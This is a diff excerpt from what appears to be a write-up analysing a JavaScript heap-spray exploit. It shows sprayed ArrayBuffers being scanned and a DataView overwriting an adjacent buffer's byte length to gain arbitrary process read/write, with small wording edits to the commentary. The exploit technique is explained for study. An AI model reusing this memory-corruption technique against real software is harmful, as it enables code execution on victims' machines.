@@ -271,7 +271,7 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
     for(var i1 = 1; i1 < spraynum; i1++){
         if( sprayarr[i1].byteLength == 0x20000-24){
             
-            // This is the magic, overwrite the next TypedArray's byte length
+            // this is the magic, overwrite the next TypedArray's byte length
             var biga = new DataView(sprayarr[i1]);
 
             // offset to the byte length in the header
@@ -288,7 +288,7 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
 
 <p class="cn" markdown="1">Now that they know, which TypedArray has a large size (`if( sprayarr[i].byteLength == 0x20000-24)`), they use it to overwrite the byte length of the adjacent ArrayBuffer (`var biga = new DataView(sprayarr[i]); biga.setUint32(0x10000-12,0x66666666);`). Then they just check that the next ArrayBuffer has a matching byte length (`if(sprayarr[i+1].byteLength == 0x66666666)`) and if it does, then they have a relative read/write out of that adjacent ArrayBuffer using a DataView (`biga = new DataView(sprayarr[i+1]);`).</p>
 
-<p class="cn" markdown="1">At this stage, they need to upgrade this primitive to a full read/write primitive across the whole process space, so they leak a pointer and base address of an Array that hold's TypedArray's.</p>
+<p class="cn" markdown="1">At this stage, they need to upgrade this primitive to a full read/write primitive across the whole process space, so they leak a pointer and base address of a TypedArray.</p>
 
 ```
             var arr = new Array(0x10000);
